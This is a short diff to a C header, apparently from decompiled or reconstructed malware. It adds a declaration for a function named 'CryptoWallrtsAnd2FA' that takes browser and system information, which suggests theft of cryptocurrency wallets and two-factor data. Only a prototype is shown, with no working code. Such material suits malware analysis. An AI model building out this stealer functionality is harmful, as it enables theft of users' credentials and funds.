@@ -157,4 +157,8 @@ int __fastcall
 ExtractValueFromKeyPath(DWORD *table, 
                         const char *key);
 
+void __fastcall 
+CryptoWallrtsAnd2FA(LPCWSTR *BrowserAllInfo, 
+                    void ***SysInfo);
+
 #endif
